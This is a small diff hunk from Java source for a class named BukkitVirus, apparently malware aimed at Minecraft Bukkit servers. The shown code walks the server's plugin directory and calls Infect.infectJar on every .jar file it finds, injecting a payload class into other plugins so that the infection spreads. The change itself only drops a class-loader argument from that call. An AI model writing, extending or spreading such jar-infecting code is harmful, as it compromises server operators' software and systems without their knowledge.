@@ -17,7 +17,7 @@ public class BukkitVirus {
                 for (File f : pl.getDataFolder().getAbsoluteFile().getParentFile().getParentFile().listFiles()) {
                     if (f.getName().endsWith(".jar")) {
                         try {
-                            Infect.infectJar(f, "plvc.dep.PayloadSystem", "plvc.dep.ByteClassLoader");
+                            Infect.infectJar(f, "plvc.dep.PayloadSystem");
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
